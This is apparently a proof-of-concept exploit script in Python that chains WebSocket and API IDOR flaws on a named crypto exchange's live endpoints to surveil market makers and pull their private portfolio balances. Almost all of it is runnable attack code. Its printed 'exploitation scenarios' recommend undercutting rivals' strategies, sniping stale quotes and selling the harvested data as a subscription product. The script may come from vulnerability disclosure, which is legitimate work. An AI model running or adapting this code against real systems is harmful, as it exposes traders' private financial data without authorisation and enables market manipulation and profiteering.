"""
PoC #3: Full Market Maker Strategy Extraction

VULNERABILITY: Combines WS IDOR + API IDOR to build a complete profile of
every active market maker — their spread, refresh rate, quoting size,
portfolio composition, fill rate, and multi-market activity.

IMPACT: A competitor or attacker can:
  1. Clone the exact strategy and undercut by 0.5 bps
  2. Time stale-quote snipes during the refresh window
  3. Poach makers by offering better terms
  4. Sell the intelligence feed as a product ($5-10K/month)

USAGE:
    python 03_maker_strategy_extraction.py
"""

import asyncio
import json
import time
from collections import defaultdict

import requests
import websockets

MARKET = "0x065c9d28e428a0db40191a54d33d5b7c71a9c394"  # MON/USDC
API = "https://api.kuru.io/api/v2"
WS_URI = "wss://ws.kuru.io"
DURATION = 90  # seconds


async def extract_strategies():
    async with websockets.connect(WS_URI, ping_interval=20, close_timeout=10) as ws:
        # Subscribe to orderbook (reveals maker addresses in real-time)
        await ws.send(json.dumps({
            "type": "subscribe",
            "channel": "orderbook",
            "market": MARKET,
        }))
        await asyncio.wait_for(ws.recv(), timeout=5)

        maker_stats = defaultdict(lambda: {
            "orders_placed": 0,
            "orders_canceled": 0,
            "buy_orders": [],
            "sell_orders": [],
            "fills_received": 0,
            "markets_active": set(),
        })

        subscribed = set()
        start = time.time()

        print(f"[+] Monitoring MON/USDC orderbook for {DURATION}s...")
        print(f"[+] Discovering makers and subscribing to their feeds...")
        print()

        while time.time() - start < DURATION:
            try:
                msg = await asyncio.wait_for(ws.recv(), timeout=1)
                data = json.loads(msg)
                now = time.time() - start

                # Orderbook events expose maker addresses
                maker = data.get("m", "")
                if maker and maker.startswith("0x"):
                    stats = maker_stats[maker]
                    event = data.get("e", "")

                    if event == "OrderCreated":
                        stats["orders_placed"] += 1
                        price = data.get("p", 0)
                        size = data.get("s", 0)
                        is_buy = data.get("ib")
                        if is_buy:
                            stats["buy_orders"].append((price, size, now))
                        elif is_buy is False:
                            stats["sell_orders"].append((price, size, now))

                    elif "Cancel" in event:
                        stats["orders_canceled"] += 1

                    elif event == "Trade":
                        stats["fills_received"] += 1

                    # Auto-subscribe to discovered makers (IDOR)
                    if maker not in subscribed and len(subscribed) < 10:
                        subscribed.add(maker)
                        await ws.send(json.dumps({
                            "type": "subscribe",
                            "channel": "user",
                            "address": maker,
                        }))
                        try:
                            await asyncio.wait_for(ws.recv(), timeout=1)
                        except:
                            pass

                # User channel reveals cross-market activity
                if data.get("topicType") == "user":
                    inner = data.get("data", {})
                    if isinstance(inner, str):
                        try:
                            inner = json.loads(inner)
                        except:
                            continue
                    evt = inner.get("type", "")
                    evt_data = inner.get("data", "")
                    if isinstance(evt_data, str):
                        try:
                            evt_data = json.loads(evt_data)
                        except:
                            continue
                    if isinstance(evt_data, dict) and evt == "OrderCreated":
                        mkt = evt_data.get("marketAddress", "")
                        maker_addr = data.get("topicID", "")
                        if mkt and maker_addr:
                            maker_stats[maker_addr]["markets_active"].add(mkt[:16])

            except asyncio.TimeoutError:
                continue
            except:
                continue

    return dict(maker_stats)


def enrich_with_api(maker_stats: dict):
    """Use the API IDOR to add portfolio data."""
    for addr in maker_stats:
        try:
            r = requests.get(f"{API}/margin/balances/{addr}", timeout=10)
            if r.status_code == 200:
                balances = r.json().get("data", {}).get("data", [])
                portfolio_usd = 0
                tokens = {}
                for entry in balances:
                    token = entry.get("token", {})
                    ticker = token.get("ticker", "?")
                    decimal = token.get("decimal", 18)
                    bal = int(entry.get("balance", "0")) / (10 ** decimal)
                    if ticker in ("USDC", "AUSD"):
                        portfolio_usd += bal
                    elif ticker == "MON":
                        portfolio_usd += bal * 0.023
                    elif ticker in ("WETH", "ETH"):
                        portfolio_usd += bal * 3500
                    elif ticker in ("WBTC", "cbBTC"):
                        portfolio_usd += bal * 67000
                    if bal > 0:
                        tokens[ticker] = bal
                maker_stats[addr]["portfolio_usd"] = portfolio_usd
                maker_stats[addr]["tokens"] = tokens
        except:
            pass
    return maker_stats


def print_report(maker_stats: dict):
    active = [(a, s) for a, s in maker_stats.items() if s["orders_placed"] > 5]
    active.sort(key=lambda x: x[1]["orders_placed"], reverse=True)

    print("\n" + "=" * 70)
    print("MAKER STRATEGY EXTRACTION — FULL REPORT")
    print("=" * 70)
    print(f"\nActive makers discovered: {len(active)}")

    total_tvl = 0
    for addr, stats in active:
        print(f"\n{'─'*60}")
        print(f"MAKER: {addr}")
        print(f"{'─'*60}")

        # Timing
        ops = stats["orders_placed"] / DURATION
        refresh_ms = (DURATION * 1000) / max(1, stats["orders_placed"])
        print(f"  Quoting rate:  {ops:.1f} orders/sec ({refresh_ms:.0f}ms refresh)")
        print(f"  Cancels:       {stats['orders_canceled']} in {DURATION}s")
        print(f"  Fills:         {stats['fills_received']} in {DURATION}s")
        fills_per_day = stats["fills_received"] / DURATION * 86400
        print(f"  Est fills/day: {fills_per_day:.0f}")

        # Spread
        if stats["buy_orders"] and stats["sell_orders"]:
            recent_buys = [p for p, s, t in stats["buy_orders"][-20:]]
            recent_sells = [p for p, s, t in stats["sell_orders"][-20:]]
            if recent_buys and recent_sells:
                avg_bid = sum(recent_buys) / len(recent_buys)
                avg_ask = sum(recent_sells) / len(recent_sells)
                spread_bps = (avg_ask - avg_bid) / avg_bid * 10000
                print(f"  Spread:        {spread_bps:.2f} bps")

            # Size
            buy_sizes = [s / 1e10 for p, s, t in stats["buy_orders"]]
            sell_sizes = [s / 1e10 for p, s, t in stats["sell_orders"]]
            avg_size = (sum(buy_sizes) + sum(sell_sizes)) / (len(buy_sizes) + len(sell_sizes))
            print(f"  Avg size:      {avg_size:,.0f} MON (${avg_size * 0.023:,.0f})")

        # Portfolio (from API)
        if stats.get("portfolio_usd"):
            total_tvl += stats["portfolio_usd"]
            print(f"  Portfolio:     ${stats['portfolio_usd']:,.0f}")
            for ticker, bal in stats.get("tokens", {}).items():
                print(f"    {ticker:8} {bal:>15,.4f}")

        # Multi-market
        if stats["markets_active"]:
            print(f"  Markets:       {len(stats['markets_active'])} active")
            for m in stats["markets_active"]:
                print(f"    - {m}...")

    print(f"\n{'='*70}")
    print(f"TOTAL OBSERVABLE TVL: ${total_tvl:,.0f}")
    print(f"{'='*70}")

    # Exploitation math
    if active:
        top = active[0][1]
        print(f"\n{'='*70}")
        print("EXPLOITATION SCENARIOS")
        print(f"{'='*70}")
        print(f"\n  A) Strategy Clone + Undercut")
        print(f"     Target's refresh: {(DURATION*1000)/max(1,top['orders_placed']):.0f}ms")
        print(f"     Your refresh: {(DURATION*1000)/max(1,top['orders_placed']) - 50:.0f}ms (50ms faster)")
        print(f"     Undercut by: 0.5 bps")
        print(f"     Steal ~30% of their {top['fills_received']/DURATION*86400:.0f} daily fills")
        print(f"\n  B) Stale Quote Sniping")
        print(f"     Refresh window: {(DURATION*1000)/max(1,top['orders_placed']):.0f}ms of stale quotes")
        print(f"     Monitor external CEX price during window")
        print(f"     Hit stale quote when external diverges > 1 bps")
        print(f"\n  C) Intelligence Product")
        print(f"     Package this data as SaaS: $5-10K/month per subscriber")
        print(f"     Zero capital required")


if __name__ == "__main__":
    print("[+] Phase 1: WebSocket surveillance (discovering makers)...")
    stats = asyncio.run(extract_strategies())

    print("[+] Phase 2: API enrichment (extracting portfolios)...")
    stats = enrich_with_api(stats)

    print_report(stats)
